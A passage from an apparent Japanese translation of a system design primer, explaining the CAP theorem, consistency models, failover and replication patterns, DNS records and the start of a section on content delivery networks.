**\u6700\u5927\u9650\u306e\u30b9\u30eb\u30fc\u30d7\u30c3\u30c8** \u3092 **\u8a31\u5bb9\u7bc4\u56f2\u5185\u306e\u30ec\u30a4\u30c6\u30f3\u30b7\u30fc** \u3067\u5b9f\u73fe\u3059\u308b\u3053\u3068\u3092\u76ee\u6307\u3059\u306e\u304c\u666e\u901a\u3060\u3002\n\n### \u305d\u306e\u4ed6\u306e\u53c2\u8003\u8cc7\u6599\u3001\u30da\u30fc\u30b8\n\n* [\u30ec\u30a4\u30c6\u30f3\u30b7\u30fc vs \u30b9\u30eb\u30fc\u30d7\u30c3\u30c8\u3092\u7406\u89e3\u3059\u308b](https:\/\/community.cadence.com\/cadence_blogs_8\/b\/sd\/archive\/2010\/09\/13\/understanding-latency-vs-throughput)\n\n## \u53ef\u7528\u6027 vs \u4e00\u8cab\u6027\n\n### CAP \u7406\u8ad6\n\n<p align=\"center\">\n  <img src=\"http:\/\/i.imgur.com\/bgLMI2u.png\"\/>\n  <br\/>\n  <i><a href=http:\/\/robertgreiner.com\/2014\/08\/cap-theorem-revisited>Source: CAP theorem revisited<\/a><\/i>\n<\/p>\n\n\u5206\u6563\u578b\u30b3\u30f3\u30d4\u30e5\u30fc\u30bf\u30b7\u30b9\u30c6\u30e0\u306b\u304a\u3044\u3066\u306f\u4e0b\u306e\u4e09\u3064\u306e\u3046\u3061\u4e8c\u3064\u307e\u3067\u3057\u304b\u540c\u6642\u306b\u4fdd\u8a3c\u3059\u308b\u3053\u3068\u306f\u3067\u304d\u306a\u3044\u3002:\n\n* **\u4e00\u8cab\u6027** - \u5168\u3066\u306e\u8aad\u307f\u8fbc\u307f\u306f\u6700\u65b0\u306e\u66f8\u304d\u8fbc\u307f\u3082\u3057\u304f\u306f\u30a8\u30e9\u30fc\u3092\u53d7\u3051\u53d6\u308b\n* **\u53ef\u7528\u6027** - \u53d7\u3051\u53d6\u308b\u60c5\u5831\u304c\u6700\u65b0\u306e\u3082\u306e\u3060\u3068\u3044\u3046\u4fdd\u8a3c\u306f\u306a\u3044\u304c\u3001\u5168\u3066\u306e\u30ea\u30af\u30a8\u30b9\u30c8\u306f\u30ec\u30b9\u30dd\u30f3\u30b9\u3092\u5fc5\u305a\u53d7\u3051\u53d6\u308b\n* **\u5206\u65ad\u8010\u6027** - \u30cd\u30c3\u30c8\u30ef\u30fc\u30af\u554f\u984c\u306b\u3088\u3063\u3066\u9806\u4e0d\u540c\u306e\u5206\u65ad\u304c\u8d77\u304d\u3066\u3082\u30b7\u30b9\u30c6\u30e0\u304c\u52d5\u4f5c\u3092\u7d9a\u3051\u308b\n\n*\u30cd\u30c3\u30c8\u30ef\u30fc\u30af\u306f\u4fe1\u983c\u3067\u304d\u306a\u3044\u306e\u3067\u3001\u5206\u65ad\u8010\u6027\u306f\u5fc5\u305a\u4fdd\u8a3c\u3057\u306a\u3051\u308c\u3070\u306a\u308a\u307e\u305b\u3093\u3002\u3064\u307e\u308a\u30bd\u30d5\u30c8\u30a6\u30a7\u30a2\u30b7\u30b9\u30c6\u30e0\u3068\u3057\u3066\u306e\u30c8\u30ec\u30fc\u30c9\u30aa\u30d5\u306f\u3001\u4e00\u8cab\u6027\u3092\u53d6\u308b\u304b\u3001\u53ef\u7528\u6027\u3092\u53d6\u308b\u304b\u3092\u8003\u3048\u306a\u3051\u308c\u3070\u306a\u308a\u307e\u305b\u3093\u3002*\n\n#### CP - \u4e00\u8cab\u6027\u3068\u5206\u65ad\u8010\u6027(consistency and partition tolerance)\n\n\u5206\u65ad\u3055\u308c\u305f\u30ce\u30fc\u30c9\u304b\u3089\u306e\u30ec\u30b9\u30dd\u30f3\u30b9\u3092\u5f85\u3061\u7d9a\u3051\u3066\u3044\u308b\u3068\u30bf\u30a4\u30e0\u30a2\u30a6\u30c8\u30a8\u30e9\u30fc\u306b\u9665\u308b\u53ef\u80fd\u6027\u304c\u3042\u308a\u307e\u3059\u3002CP\u306f\u3042\u306a\u305f\u306e\u30b5\u30fc\u30d3\u30b9\u304c\u30a2\u30c8\u30df\u30c3\u30af\u306a\u8aad\u307f\u66f8\u304d\uff08\u4e0d\u53ef\u5206\u64cd\u4f5c\uff09\u3092\u5fc5\u8981\u3068\u3059\u308b\u969b\u306b\u306f\u3044\u3044\u9078\u629e\u80a2\u3067\u3057\u3087\u3046\u3002\n\n#### AP - \u53ef\u7528\u6027\u3068\u5206\u65ad\u8010\u6027(availability and partition tolerance)\n\n\u30ec\u30b9\u30dd\u30f3\u30b9\u306f\u30ce\u30fc\u30c9\u4e0a\u306b\u3042\u308b\u30c7\u30fc\u30bf\u3067\u6700\u65b0\u306e\u3082\u306e\u3092\u8fd4\u3057\u307e\u3059\u3002\u3064\u307e\u308a\u3001\u6700\u65b0\u7248\u306e\u30c7\u30fc\u30bf\u304c\u8fd4\u3055\u308c\u308b\u3068\u306f\u9650\u308a\u307e\u305b\u3093\u3002\u5206\u65ad\u304c\u89e3\u6d88\u3055\u308c\u305f\u5f8c\u3082\u3001\u66f8\u304d\u8fbc\u307f\u304c\u53cd\u6620\u3055\u308c\u308b\u306e\u306b\u306f\u6642\u9593\u304c\u304b\u304b\u308a\u307e\u3059\u3002\n\n[\u7d50\u679c\u6574\u5408\u6027](#\u7d50\u679c\u6574\u5408\u6027)\u3000\u3092\u6c42\u3081\u308b\u30b5\u30fc\u30d3\u30b9\u306e\u969b\u306b\u306fAP\u3092\u63a1\u7528\u3059\u308b\u306e\u304c\u3044\u3044\u3067\u3057\u3087\u3046\u3002\u3082\u3057\u304f\u306f\u3001\u5916\u90e8\u30a8\u30e9\u30fc\u306b\u95a2\u308f\u3089\u305a\u30b7\u30b9\u30c6\u30e0\u304c\u7a3c\u50cd\u3059\u308b\u5fc5\u8981\u304c\u3042\u308b\u969b\u306b\u3082\u540c\u69d8\u3067\u3059\u3002\n\n### \u305d\u306e\u4ed6\u306e\u53c2\u8003\u8cc7\u6599\u3001\u30da\u30fc\u30b8\n\n* [CAP \u7406\u8ad6\u3092\u632f\u308a\u8fd4\u308b](http:\/\/robertgreiner.com\/2014\/08\/cap-theorem-revisited\/)\n* [\u5e73\u6613\u306a\u82f1\u8a9e\u3067\u306eCAP \u7406\u8ad6\u306e\u30a4\u30f3\u30c8\u30ed](http:\/\/ksat.me\/a-plain-english-introduction-to-cap-theorem\/)\n* [CAP FAQ](https:\/\/github.com\/henryr\/cap-faq)\n\n## \u4e00\u8cab\u6027\u30d1\u30bf\u30fc\u30f3\n\n\u540c\u3058\u30c7\u30fc\u30bf\u306e\u8907\u88fd\u304c\u8907\u6570\u3042\u308b\u72b6\u614b\u3067\u306f\u3001\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u304c\u4e00\u8cab\u3057\u305f\u30c7\u30fc\u30bf\u8868\u793a\u3092\u53d7\u3051\u53d6\u308b\u305f\u3081\u306b\u3001\u3069\u306e\u3088\u3046\u306b\u305d\u308c\u3089\u3092\u540c\u671f\u3059\u308c\u3070\u3044\u3044\u306e\u304b\u3068\u3044\u3046\u8ab2\u984c\u304c\u3042\u308a\u307e\u3059\u3002 [CAP \u7406\u8ad6](#cap-\u7406\u8ad6) \u306b\u304a\u3051\u308b\u4e00\u8cab\u6027\u306e\u5b9a\u7fa9\u3092\u601d\u3044\u51fa\u3057\u3066\u307f\u307e\u3057\u3087\u3046\u3002\u5168\u3066\u306e\u8aad\u307f\u53d6\u308a\u306f\u6700\u65b0\u306e\u66f8\u304d\u8fbc\u307f\u30c7\u30fc\u30bf\u3082\u3057\u304f\u306f\u30a8\u30e9\u30fc\u3092\u53d7\u3051\u53d6\u308b\u306f\u305a\u3067\u3059\u3002\n\n### \u5f31\u3044\u4e00\u8cab\u6027\n\n\u66f8\u304d\u8fbc\u307f\u5f8c\u306e\u8aad\u307f\u53d6\u308a\u3067\u306f\u3001\u305d\u306e\u6700\u65b0\u306e\u66f8\u304d\u8fbc\u307f\u3092\u8aad\u3081\u305f\u308a\u8aad\u3081\u306a\u304b\u3063\u305f\u308a\u3059\u308b\u3002\u30d9\u30b9\u30c8\u30a8\u30d5\u30a9\u30fc\u30c8\u578b\u306e\u30a2\u30d7\u30ed\u30fc\u30c1\u306b\u57fa\u3065\u304f\u3002\n\n\u3053\u306e\u30a2\u30d7\u30ed\u30fc\u30c1\u306fmemcached\u306a\u3069\u306e\u30b7\u30b9\u30c6\u30e0\u306b\u898b\u3089\u308c\u307e\u3059\u3002\u5f31\u3044\u4e00\u8cab\u6027\u306f\u30ea\u30a2\u30eb\u30bf\u30a4\u30e0\u6027\u304c\u5fc5\u8981\u306a\u30e6\u30fc\u30b9\u30b1\u30fc\u30b9\u3001\u4f8b\u3048\u3070VoIP\u3001\u30d3\u30c7\u30aa\u30c1\u30e3\u30c3\u30c8\u3001\u30ea\u30a2\u30eb\u30bf\u30a4\u30e0\u30de\u30eb\u30c1\u30d7\u30ec\u30a4\u30e4\u30fc\u30b2\u30fc\u30e0\u306a\u3069\u3068\u76f8\u6027\u304c\u3044\u3044\u3067\u3057\u3087\u3046\u3002\u4f8b\u3048\u3070\u3001\u96fb\u8a71\u306b\u51fa\u3066\u3044\u308b\u3068\u304d\u306b\u6570\u79d2\u9593\u97f3\u58f0\u304c\u53d7\u3051\u53d6\u308c\u306a\u304f\u306a\u3063\u305f\u3068\u3057\u305f\u3089\u3001\u305d\u306e\u5f8c\u306b\u63a5\u7d9a\u304c\u56de\u5fa9\u3057\u3066\u3082\u305d\u306e\u63a5\u7d9a\u304c\u5207\u65ad\u3055\u308c\u3066\u3044\u305f\u9593\u306b\u8a71\u3055\u308c\u3066\u3044\u305f\u3053\u3068\u306f\u805e\u304d\u53d6\u308c\u306a\u3044\u3068\u3044\u3046\u3088\u3046\u306a\u611f\u3058\u3067\u3059\u3002\n\n### \u7d50\u679c\u6574\u5408\u6027\n\n\u66f8\u304d\u8fbc\u307f\u306e\u5f8c\u3001\u8aad\u307f\u53d6\u308a\u306f\u6700\u7d42\u7684\u306b\u306f\u305d\u306e\u7d50\u679c\u3092\u8aad\u307f\u53d6\u308b\u3053\u3068\u304c\u3067\u304d\u308b(\u30df\u30ea\u79d2\u307b\u3069\u9045\u308c\u3066\u3068\u3044\u3046\u306e\u304c\u4e00\u822c\u7684\u3067\u3059)\u3002\u30c7\u30fc\u30bf\u306f\u975e\u540c\u671f\u7684\u306b\u8907\u88fd\u3055\u308c\u307e\u3059\u3002\n\n\u3053\u306e\u30a2\u30d7\u30ed\u30fc\u30c1\u306fDNS\u3084\u30e1\u30fc\u30eb\u30b7\u30b9\u30c6\u30e0\u306a\u3069\u306b\u63a1\u7528\u3055\u308c\u3066\u3044\u307e\u3059\u3002\u7d50\u679c\u6574\u5408\u6027\u306f\u591a\u304f\u306e\u30ea\u30af\u30a8\u30b9\u30c8\u3092\u634c\u304f\u30b5\u30fc\u30d3\u30b9\u3068\u76f8\u6027\u304c\u3044\u3044\u3067\u3057\u3087\u3046\u3002\n\n### \u5f37\u3044\u4e00\u8cab\u6027\n\n\u66f8\u304d\u8fbc\u307f\u306e\u5f8c\u3001\u8aad\u307f\u53d6\u308a\u306f\u305d\u308c\u3092\u5fc5\u305a\u8aad\u3080\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002\u30c7\u30fc\u30bf\u306f\u540c\u671f\u7684\u306b\u8907\u88fd\u3055\u308c\u307e\u3059\u3002\n\n\u3053\u306e\u30a2\u30d7\u30ed\u30fc\u30c1\u306f\u30d5\u30a1\u30a4\u30eb\u30b7\u30b9\u30c6\u30e0\u3084RDBMS\u306a\u3069\u3067\u63a1\u7528\u3055\u308c\u3066\u3044\u307e\u3059\u3002\u30c8\u30e9\u30f3\u30b6\u30af\u30b7\u30e7\u30f3\u3092\u6271\u3046\u30b5\u30fc\u30d3\u30b9\u3067\u306f\u5f37\u3044\u4e00\u8cab\u6027\u304c\u5fc5\u8981\u3067\u3057\u3087\u3046\u3002\n\n### \u305d\u306e\u4ed6\u306e\u53c2\u8003\u8cc7\u6599\u3001\u30da\u30fc\u30b8\n\n* [\u30c7\u30fc\u30bf\u30bb\u30f3\u30bf\u30fc\u9593\u3067\u306e\u30c8\u30e9\u30f3\u30b6\u30af\u30b7\u30e7\u30f3](http:\/\/snarfed.org\/transactions_across_datacenters_io.html)\n\n## \u53ef\u7528\u6027\u30d1\u30bf\u30fc\u30f3\n\n\u9ad8\u3044\u53ef\u7528\u6027\u3092\u62c5\u4fdd\u3059\u308b\u306b\u306f\u4e3b\u306b\u6b21\u306e\u4e8c\u3064\u306e\u30d1\u30bf\u30fc\u30f3\u304c\u3042\u308a\u307e\u3059: **\u30d5\u30a7\u30a4\u30eb\u30aa\u30fc\u30d0\u30fc** \u3068 **\u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3** \u3067\u3059\u3002\n\n### \u30d5\u30a7\u30a4\u30eb\u30aa\u30fc\u30d0\u30fc\n\n#### \u30a2\u30af\u30c6\u30a3\u30d6\u30fb\u30d1\u30c3\u30b7\u30d6\n\n\u30a2\u30af\u30c6\u30a3\u30d6\u30fb\u30d1\u30c3\u30b7\u30d6\u30d5\u30a7\u30a4\u30eb\u30aa\u30fc\u30d0\u30fc\u306b\u304a\u3044\u3066\u306f\u3001\u5468\u671f\u4fe1\u53f7\u306f\u30a2\u30af\u30c6\u30a3\u30d6\u3082\u3057\u304f\u306f\u30b9\u30bf\u30f3\u30d0\u30a4\u4e2d\u306e\u30d1\u30c3\u30b7\u30d6\u306a\u30b5\u30fc\u30d0\u30fc\u306b\u9001\u3089\u308c\u307e\u3059\u3002\u5468\u671f\u4fe1\u53f7\u304c\u4e2d\u65ad\u3055\u308c\u305f\u6642\u306b\u306f\u3001\u30d1\u30c3\u30b7\u30d6\u3060\u3063\u305f\u30b5\u30fc\u30d0\u30fc\u304c\u30a2\u30af\u30c6\u30a3\u30d6\u30b5\u30fc\u30d0\u30fc\u306eIP\u30a2\u30c9\u30ec\u30b9\u3092\u5f15\u304d\u7d99\u3044\u3067\u30b5\u30fc\u30d3\u30b9\u3092\u518d\u958b\u3057\u307e\u3059\u3002\n\n\u8d77\u52d5\u307e\u3067\u306e\u30c0\u30a6\u30f3\u30bf\u30a4\u30e0\u306f\u30d1\u30c3\u30b7\u30d6\u30b5\u30fc\u30d0\u30fc\u304c\u300c\u30db\u30c3\u30c8\u300d\u306a\u30b9\u30bf\u30f3\u30d0\u30a4\u72b6\u614b\u306b\u3042\u308b\u304b\u3001\u300c\u30b3\u30fc\u30eb\u30c9\u300d\u306a\u30b9\u30bf\u30f3\u30d0\u30a4\u72b6\u614b\u306b\u3042\u308b\u304b\u3067\u5909\u308f\u308a\u307e\u3059\u3002\u30a2\u30af\u30c6\u30a3\u30d6\u306a\u30b5\u30fc\u30d0\u30fc\u306e\u307f\u304c\u30c8\u30e9\u30d5\u30a3\u30c3\u30af\u3092\u634c\u304d\u307e\u3059\u3002\n\n\u30a2\u30af\u30c6\u30a3\u30d6\u30fb\u30d1\u30c3\u30b7\u30d6\u30d5\u30a7\u30a4\u30eb\u30aa\u30fc\u30d0\u30fc\u306f\u30de\u30b9\u30bf\u30fc\u30fb\u30b9\u30ec\u30fc\u30d6\u30d5\u30a7\u30a4\u30eb\u30aa\u30fc\u30d0\u30fc\u3068\u547c\u3070\u308c\u308b\u3053\u3068\u3082\u3042\u308a\u307e\u3059\u3002\n\n#### \u30a2\u30af\u30c6\u30a3\u30d6\u30fb\u30a2\u30af\u30c6\u30a3\u30d6\n\n\u30a2\u30af\u30c6\u30a3\u30d6\u30a2\u30af\u30c6\u30a3\u30d6\u69cb\u6210\u3067\u306f\u4e21\u65b9\u306e\u30b5\u30fc\u30d0\u30fc\u304c\u30c8\u30e9\u30d5\u30a3\u30c3\u30af\u3092\u634c\u304f\u3053\u3068\u3067\u8ca0\u8377\u3092\u5206\u6563\u3057\u307e\u3059\u3002\n\n\u3053\u308c\u3089\u306e\u30b5\u30fc\u30d0\u30fc\u304c\u30d1\u30d6\u30ea\u30c3\u30af\u306a\u3082\u306e\u306e\u5834\u5408\u3001DNS\u306f\u4e21\u65b9\u306e\u30b5\u30fc\u30d0\u30fc\u306e\u30d1\u30d6\u30ea\u30c3\u30afIP\u3092\u77e5\u3063\u3066\u3044\u308b\u5fc5\u8981\u304c\u3042\u308a\u307e\u3059\u3002\u3082\u3057\u3001\u30d7\u30e9\u30a4\u30d9\u30fc\u30c8\u306a\u3082\u306e\u306a\u5834\u5408\u3001\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u30ed\u30b8\u30c3\u30af\u304c\u4e21\u65b9\u306e\u30b5\u30fc\u30d0\u30fc\u306e\u60c5\u5831\u306b\u3064\u3044\u3066\u77e5\u3063\u3066\u3044\u308b\u5fc5\u8981\u304c\u3042\u308a\u307e\u3059\u3002\n\n\u30a2\u30af\u30c6\u30a3\u30d6\u30fb\u30a2\u30af\u30c6\u30a3\u30d6\u306a\u30d5\u30a7\u30a4\u30eb\u30aa\u30fc\u30d0\u30fc\u306f\u30de\u30b9\u30bf\u30fc\u30fb\u30de\u30b9\u30bf\u30fc\u30d5\u30a7\u30a4\u30eb\u30aa\u30fc\u30d0\u30fc\u3068\u547c\u3070\u308c\u308b\u3053\u3068\u3082\u3042\u308a\u307e\u3059\u3002\n\n### \u77ed\u6240: \u30d5\u30a7\u30a4\u30eb\u30aa\u30fc\u30d0\u30fc\n\n* \u30d5\u30a7\u30a4\u30eb\u30aa\u30fc\u30d0\u30fc\u3067\u306f\u3088\u308a\u591a\u304f\u306e\u30cf\u30fc\u30c9\u30a6\u30a7\u30a2\u3092\u8981\u3057\u3001\u8907\u96d1\u3055\u304c\u5897\u3057\u307e\u3059\u3002\n* \u6700\u65b0\u306e\u66f8\u304d\u8fbc\u307f\u304c\u30d1\u30c3\u30b7\u30d6\u30b5\u30fc\u30d0\u30fc\u306b\u8907\u88fd\u3055\u308c\u308b\u524d\u306b\u30a2\u30af\u30c6\u30a3\u30d6\u304c\u843d\u3061\u308b\u3068\u3001\u30c7\u30fc\u30bf\u6b20\u640d\u304c\u8d77\u304d\u308b\u6f5c\u5728\u53ef\u80fd\u6027\u304c\u3042\u308a\u307e\u3059\u3002\n\n### \u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\n\n#### \u30de\u30b9\u30bf\u30fc\u30fb\u30b9\u30ec\u30fc\u30d6\u3000\u3068\u3000\u30de\u30b9\u30bf\u30fc\u30fb\u30de\u30b9\u30bf\u30fc\n\n\u3053\u306e\u30c8\u30d4\u30c3\u30af\u306f [\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9](#\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9) \u30bb\u30af\u30b7\u30e7\u30f3\u306b\u304a\u3044\u3066\u3088\u308a\u8a73\u7d30\u306b\u89e3\u8aac\u3055\u308c\u3066\u3044\u307e\u3059:\n\n* [\u30de\u30b9\u30bf\u30fc\u30fb\u30b9\u30ec\u30fc\u30d6 \u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3](#\u30de\u30b9\u30bf\u30fc\u30b9\u30ec\u30fc\u30d6-\u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3)\n* [\u30de\u30b9\u30bf\u30fc\u30fb\u30de\u30b9\u30bf\u30fc \u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3](#\u30de\u30b9\u30bf\u30fc\u30de\u30b9\u30bf\u30fc-\u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3)\n\n## \u30c9\u30e1\u30a4\u30f3\u30cd\u30fc\u30e0\u30b7\u30b9\u30c6\u30e0\n\n<p align=\"center\">\n  <img src=\"http:\/\/i.imgur.com\/IOyLj4i.jpg\"\/>\n  <br\/>\n  <i><a href=http:\/\/www.slideshare.net\/srikrupa5\/dns-security-presentation-issa>Source: DNS security presentation<\/a><\/i>\n<\/p>\n\n\u30c9\u30e1\u30a4\u30f3\u30cd\u30fc\u30e0\u30b7\u30b9\u30c6\u30e0 (DNS) \u306f www.example.com \u306a\u3069\u306e\u30c9\u30e1\u30a4\u30f3\u30cd\u30fc\u30e0\u3092IP\u30a2\u30c9\u30ec\u30b9\u3078\u3068\u7ffb\u8a33\u3057\u307e\u3059\u3002\n\nDNS\u306f\u5c11\u6570\u306e\u30aa\u30fc\u30bd\u30e9\u30a4\u30ba\u3055\u308c\u305f\u30b5\u30fc\u30d0\u30fc\u304c\u4e0a\u4f4d\u306b\u4f4d\u7f6e\u3059\u308b\u968e\u5c64\u7684\u69cb\u9020\u3067\u3059\u3002\u3042\u306a\u305f\u306e\u30eb\u30fc\u30bf\u30fc\u3082\u3057\u304f\u306fISP\u306f\u691c\u7d22\u3092\u3059\u308b\u969b\u306b\u3069\u306eDNS\u30b5\u30fc\u30d0\u30fc\u306b\u63a5\u7d9a\u3059\u308b\u304b\u3068\u3044\u3046\u60c5\u5831\u3092\u63d0\u4f9b\u3057\u307e\u3059\u3002\u4f4e\u3044\u968e\u5c64\u306eDNS\u30b5\u30fc\u30d0\u30fc\u306f\u305d\u306e\u7d4c\u8def\u30de\u30c3\u30d7\u3092\u30ad\u30e3\u30c3\u30b7\u30e5\u3057\u307e\u3059\u3002\u305f\u3060\u3001\u3053\u306e\u60c5\u5831\u306f\u4f1d\u642c\u9045\u5ef6\u306b\u3088\u3063\u3066\u9673\u8150\u5316\u3059\u308b\u53ef\u80fd\u6027\u304c\u3042\u308a\u307e\u3059\u3002DNS\u306e\u7d50\u679c\u306f\u3042\u306a\u305f\u306e\u30d6\u30e9\u30a6\u30b6\u3082\u3057\u304f\u306fOS\u306b\u4e00\u5b9a\u671f\u9593\uff08[time to live (TTL)](https:\/\/en.wikipedia.org\/wiki\/Time_to_live)\u306b\u8a2d\u5b9a\u3055\u308c\u305f\u671f\u9593\uff09\u30ad\u30e3\u30c3\u30b7\u30e5\u3055\u308c\u307e\u3059\u3002\n\n* **NS record (name server)** - \u3042\u306a\u305f\u306e\u30c9\u30e1\u30a4\u30f3\u30fb\u30b5\u30d6\u30c9\u30e1\u30a4\u30f3\u3067\u306eDNS\u30b5\u30fc\u30d0\u30fc\u3092\u7279\u5b9a\u3057\u307e\u3059\u3002\n* **MX record (mail exchange)** - \u30e1\u30c3\u30bb\u30fc\u30b8\u3092\u53d7\u3051\u53d6\u308b\u30e1\u30fc\u30eb\u30b5\u30fc\u30d0\u30fc\u3092\u7279\u5b9a\u3057\u307e\u3059\u3002\n* **A record (address)** - IP\u30a2\u30c9\u30ec\u30b9\u306b\u540d\u524d\u3092\u3064\u3051\u307e\u3059\u3002\n* **CNAME (canonical)** - \u4ed6\u306e\u540d\u524d\u3082\u3057\u304f\u306f\u3000`CNAME` (example.com \u3092 www.example.com) \u3082\u3057\u304f\u306f `A` record\u3078\u3068\u540d\u524d\u3092\u6307\u3057\u793a\u3059\u3002\n\n[CloudFlare](https:\/\/www.cloudflare.com\/dns\/) \u3084 [Route 53](https:\/\/aws.amazon.com\/route53\/) \u306a\u3069\u306e\u30b5\u30fc\u30d3\u30b9\u306f\u30de\u30cd\u30fc\u30b8\u30c9DNS\u30b5\u30fc\u30d3\u30b9\u3092\u63d0\u4f9b\u3057\u3066\u3044\u307e\u3059\u3002\u3044\u304f\u3064\u304b\u306eDNS\u30b5\u30fc\u30d3\u30b9\u3067\u306f\u69d8\u3005\u306a\u624b\u6cd5\u3092\u4f7f\u3063\u3066\u30c8\u30e9\u30d5\u30a3\u30c3\u30af\u3092\u634c\u304f\u3053\u3068\u304c\u3067\u304d\u307e\u3059:\n\n* [\u52a0\u91cd\u30e9\u30a6\u30f3\u30c9\u30ed\u30d3\u30f3](http:\/\/g33kinfo.com\/info\/archives\/2657)\n    * \u30c8\u30e9\u30d5\u30a3\u30c3\u30af\u304c\u30e1\u30f3\u30c6\u30ca\u30f3\u30b9\u4e2d\u306e\u30b5\u30fc\u30d0\u30fc\u306b\u884c\u304f\u306e\u3092\u9632\u304e\u307e\u3059\n    * \u69d8\u3005\u306a\u30af\u30e9\u30b9\u30bf\u30fc\u30b5\u30a4\u30ba\u306b\u5fdc\u3058\u3066\u8abf\u6574\u3057\u307e\u3059\n    * A\/B \u30c6\u30b9\u30c8\n* \u30ec\u30a4\u30c6\u30f3\u30b7\u30fc\u30d9\u30fc\u30b9\n* \u5730\u7406\u30d9\u30fc\u30b9\n\n### \u6b20\u70b9: DNS\n\n* \u4e0a\u8a18\u3067\u793a\u3055\u308c\u3066\u3044\u308b\u3088\u3046\u306a\u30ad\u30e3\u30c3\u30b7\u30f3\u30b0\u306b\u3088\u3063\u3066\u7de9\u548c\u3055\u308c\u3066\u3044\u308b\u3068\u306f\u3044\u3048\u3001DNS\u30b5\u30fc\u30d0\u30fc\u3078\u306e\u63a5\u7d9a\u306b\u306f\u5c11\u3057\u9045\u5ef6\u304c\u751f\u3058\u308b\u3002\n* DNS\u30b5\u30fc\u30d0\u30fc\u306f\u3001[\u653f\u5e9c\u3001ISP\u4f01\u696d,\u305d\u3057\u3066\u5927\u4f01\u696d](http:\/\/superuser.com\/questions\/472695\/who-controls-the-dns-servers\/472729)\u306b\u7ba1\u7406\u3055\u308c\u3066\u3044\u308b\u304c\u3001\u305d\u308c\u3089\u306e\u7ba1\u7406\u306f\u8907\u96d1\u3067\u3042\u308b\u3002\n* DNS\u30b5\u30fc\u30d3\u30b9\u306f[DDoS attack](http:\/\/dyn.com\/blog\/dyn-analysis-summary-of-friday-october-21-attack\/)\u306e\u4f8b\u3067\u3001IP\u30a2\u30c9\u30ec\u30b9\u306a\u3057\u306b\u30e6\u30fc\u30b6\u30fc\u304cTwitter\u306a\u3069\u306b\u30a2\u30af\u30bb\u30b9\u3067\u304d\u306a\u304f\u306a\u3063\u305f\u3088\u3046\u306b\u3001\u653b\u6483\u3092\u53d7\u3051\u308b\u53ef\u80fd\u6027\u304c\u3042\u308b\u3002\n\n### \u305d\u306e\u4ed6\u306e\u53c2\u8003\u8cc7\u6599\u3001\u30da\u30fc\u30b8\n\n* [DNS \u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3](https:\/\/technet.microsoft.com\/en-us\/library\/dd197427(v=ws.10).aspx)\n* [Wikipedia](https:\/\/en.wikipedia.org\/wiki\/Domain_Name_System)\n* [DNS \u8a18\u4e8b](https:\/\/support.dnsimple.com\/categories\/dns\/)\n\n## \u30b3\u30f3\u30c6\u30f3\u30c4\u30c7\u30ea\u30d0\u30ea\u30fc\u30cd\u30c3\u30c8\u30ef\u30fc\u30af(Content delivery network)\n\n<p align=\"center\">\n  <img src=\"http:\/\/i.imgur.com\/h9TAuGI.jpg\"\/>\n  <br\/>\n  <i><a href=https:\/\/www.creative-artworks.eu\/why-use-a-content-delivery-network-cdn\/>Source: Why use a CDN<\/a><\/i>\n<\/p>\n\n\u30b3\u30f3\u30c6\u30f3\u30c4\u30c7\u30ea\u30d0\u30ea\u30fc\u30cd\u30c3\u30c8\u30ef\u30fc\u30af(CDN)\u306f\u4e16\u754c\u4e2d\u306b\u914d\u7f6e\u3055\u308c\u305f\u30d7\u30ed\u30ad\u30b7\u30b5\u30fc\u30d0\u30fc\u306e\u30cd\u30c3\u30c8\u30ef\u30fc\u30af\u304c\u30e6\u30fc\u30b6\u30fc\u306b\u4e00\u756a\u5730\u7406\u7684\u306b\u8fd1\u3044\u30b5\u30fc\u30d0\u30fc\u304b\u3089\u30b3\u30f3\u30c6\u30f3\u30c4\u3092\u914d\u4fe1\u3059\u308b\u30b7\u30b9\u30c6\u30e0\u306e\u3053\u3068\u3067\u3059\u3002Amazon\u306eCloudFront\u306a\u3069\u306f\u4f8b\u5916\u7684\u306b\u30c0\u30a4\u30ca\u30df\u30c3\u30af\u306a\u30b3\u30f3\u30c6\u30f3\u30c4\u3082\u914d\u4fe1\u3057\u307e\u3059\u304c\u3001\u4e00\u822c\u7684\u306b\u3001HTML\/CSS\/JS\u3001\u5199\u771f\u3001\u305d\u3057\u3066\u52d5\u753b\u306a\u3069\u306e\u9759\u7684\u30d5\u30a1\u30a4\u30eb\u304cCDN\u3092\u901a\u3058\u3066\u914d\u4fe1\u3055\u308c\u307e\u3059\u3002\u305d\u306e\u30b5\u30a4\u30c8\u306eDNS\u304c\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u306b\u3069\u306e\u30b5\u30fc\u30d0\u30fc\u3068\u4ea4\u4fe1\u3059\u308b\u304b\u3068\u3044\u3046\u60c5\u5831\u3092\u4f1d\u3048\u307e\u3059\u3002\n\nCDN\u3092\u7528\u3044\u3066\u30b3\u30f3\u30c6\u30f3\u30c4\u3092\u914d\u4fe1\u3059\u308b\u3053\u3068\u3067\u4ee5\u4e0b\u306e\u4e8c\u3064\u306e\u7406\u7531\u3067\u30d1\u30d5\u30a9\u30fc\u30de\u30f3\u30b9\u304c\u5287\u7684\u306b\u5411\u4e0a\u3057\u307e\u3059:\n\n* \u30e6\u30fc\u30b6\u30fc\u306f\u8fd1\u304f\u306b\u3042\u308b\u30c7\u30fc\u30bf\u30bb\u30f3\u30bf\u30fc\u304b\u3089\u53d7\u4fe1\u3067\u304d\u308b\n* \u30d0\u30c3\u30af\u30a8\u30f3\u30c9\u30b5\u30fc\u30d0\u30fc\u306fCDN\u304c\u51e6\u7406\u3057\u3066\u304f\u308c\u308b\u30ea\u30af\u30a8\u30b9\u30c8\u306b\u95a2\u3057\u3066\u306f\u51e6\u7406\u3059\u308b\u5fc5\u8981\u304c\u306a\u304f\u306a\u308a\u307e\u3059\n\n### 